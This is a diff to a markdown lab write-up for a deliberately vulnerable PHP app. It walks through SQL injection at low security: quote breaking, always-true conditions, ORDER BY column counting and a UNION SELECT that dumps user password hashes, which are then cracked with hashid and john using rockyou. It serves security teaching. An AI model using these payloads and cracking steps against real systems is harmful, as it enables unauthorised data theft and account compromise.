@@ -37,11 +37,11 @@ A SQL injection (SQLi) attack consists of insertion or "injection" of a SQL quer
 
 ## PHP required configurations
 
-Before start working on this lab, we must ensure that the `diplay_errors` PHP configuration is `On`. If not we won't be able to get any error messages back which will make the lab much harder.
+Before start working on this lab, we must ensure that the `display_errors` PHP configuration is `On`. If not we won't be able to get any error messages back which will make the lab much harder.
 
 1. Go to PHP Info and check the value of `display_errors` variable:
 
-    ![](php_info.png)
+    ![](php_info.png){: width='70%' }
 
     ![](errors_off.png)
 
@@ -52,23 +52,25 @@ Before start working on this lab, we must ensure that the `diplay_errors` PHP co
 3. Change `display_errors` to `On` on both parts of the file:
 
     ```shell
-    sudo nano [filePath]
+    # edit the php.ini file, change the path if different
+    $ sudo nano /etc/php/8.2/fpm/php.ini
     ```
 
     Press `CTRL+W` > 'display_errors' > `ENTER` > Change to `On`.
 
-    ![](config_file_errors1.png)
+    ![](config_file_errors1.png){: width='80%' }
 
     Press `CTRL+W` again > 'display_errors' > `ENTER` > Change to `On`.
 
-    ![](config_file_errors2.png)
+    ![](config_file_errors2.png){: width='80%' }
 
     Press `CTRL+X` to exit and save the file.
 
 4. Restart the PHP service (change `8.2` to the appropriate version if different):
 
     ```shell
-    sudo service php8.2-fpm restart
+    # restart the php-fpm service
+    $ sudo service php8.2-fpm restart
     ```
 
 5. Refresh the PHP Info page:
@@ -143,15 +145,109 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
     ![](home_id1.png)
 
-    > Looking at the source code this translates to `"SELECT first_name, last_name FROM users WHERE user_id = '1';"`
+    This translates to:
+    ```sql
+    SELECT first_name, last_name 
+    FROM users 
+    WHERE user_id = '1';
+    ```
 
-2. If we input something that does not exist, such as `6'`, and follow that by something that is always `TRUE`, such as `'1'='1`, we will get everything back: no matter what the `ID` is `'1'='1'` is always `TRUE`, aka always `TRUE` scenario. We are essentially saying "display all records that are `FALSE` and all records that are `TRUE`. :
+2. We can try to break the query by inserting a single quote, `'`, and see what happens:
+
+    ![](single_quote.png)
+
+
+3. We can try the "Always True Scenario": if we input something that does not exist, such as `%'`, and follow that by something that is always `TRUE`, such as `'1'='1`, we will get everything back. We are essentially saying "display all records that are `FALSE` and all records that are `TRUE`:
 
     ![](sqli_users.png)
 
-    > This translates to: `"SELECT first_name, last_name FROM users WHERE user_id = '6' OR '1'='1';"`.
+    This translates to: 
+    ```sql
+    SELECT first_name, last_name 
+    FROM users 
+    WHERE user_id = '6' 
+    OR '1'='1'
+    ```
 
-3. 
+3. So we have the `First name` and `Surname` fields of all 5 users. We need to first find out if more fields are available in the database. According to [PortSwigger](https://portswigger.net/web-security/sql-injection/union-attacks) one way of doing that is by a UNION attack and the use of `ORDER BY` clause:
+
+    > Notice that we are using [MariaDB](https://mariadb.com/kb/en/comment-syntax/), so we need to end our payload either with `#` or `-- `.
+
+    If we inject `' ORDER BY 1--` we get nothing back, so we increment the number until we get an error:
+
+    ![](order_by_3.png)
+
+4. We got the error on `3`, so this confirms that there are only 2 fields in that table. We can try guessing those fields, for instance, inputting `' UNION SELECT username, password FROM users#`:
+
+    ![](username_error.png)
+
+5. The field `username` does not exist, so we could try changing that to something similar, such as `' UNION SELECT user, password FROM users#`:
+
+    ![](user_success.png)
+
+6. Instead of plaintext passwords, the database has stored the hashes. We can find the hash type as follows:
+
+    ```shell
+    # check the hash type
+    $ hashid 5f4dcc3b5aa765d61d8327deb882cf99
+    Analyzing '5f4dcc3b5aa765d61d8327deb882cf99'
+    [+] MD2
+    [+] MD5
+    [+] MD4
+    [+] Double MD5
+    [+] LM
+    [+] RIPEMD-128
+    [+] Haval-128
+    [+] Tiger-128
+    [+] Skein-256(128)
+    [+] Skein-512(128)
+    [+] Lotus Notes/Domino 5
+    [+] Skype
+    [+] Snefru-128
+    [+] NTLM
+    [+] Domain Cached Credentials
+    [+] Domain Cached Credentials 2
+    [+] DNSSEC(NSEC3)
+    [+] RAdmin v2.x
+    ```
+
+7. We can copy and paste all hashes (one per line) into a text file and use `john` to crack them:
+
+    ```shell
+    # copy and paste the hashes into a txt file
+    $ cat hashes
+    5f4dcc3b5aa765d61d8327deb882cf99
+    e99a18c428cb38d5f260853678922e03
+    8d3533d75ae2c3966d7e0d4fcc69216b
+    0d107d09f5bbe40cade3de5c71e9e9b7
+    5f4dcc3b5aa765d61d8327deb882cf99
+
+    # find how the MD5 format is defined
+    $ john --list=formats | grep MD5
+    416 formats (149 dynamic formats shown as just "dynamic_n" here)
+    Padlock, Palshop, Panama, PBKDF2-HMAC-MD4, PBKDF2-HMAC-MD5, PBKDF2-HMAC-SHA1,
+    Raw-Blake2, Raw-Keccak, Raw-Keccak-256, Raw-MD4, Raw-MD5, Raw-MD5u, Raw-SHA1,
+    solarwinds, SSH, sspr, Stribog-256, Stribog-512, STRIP, SunMD5, SybaseASE,
+    HMAC-MD5, HMAC-SHA1, HMAC-SHA224, HMAC-SHA256, HMAC-SHA384, HMAC-SHA512,
+
+    # crack the hashes
+    $ john --format=Raw-MD5 hashes --wordlist=/usr/share/wordlists/rockyou.txt
+    Using default input encoding: UTF-8
+    Loaded 4 password hashes with no different salts (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
+    Warning: no OpenMP support for this hash type, consider --fork=16
+    Press 'q' or Ctrl-C to abort, almost any other key for status
+    password         (?)
+    abc123           (?)
+    letmein          (?)
+    charley          (?)
+    4g 0:00:00:00 DONE (2023-12-12 16:49) 133.3g/s 102400p/s 102400c/s 179200C/s skyblue..dangerous
+    Warning: passwords printed above might not be all those cracked
+    Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+    Session completed.
+    ```
+
+    > Notice that the first and last hash are the same, that is why we have 4 passwords as our output.
+
 
 ## Security: Medium
 
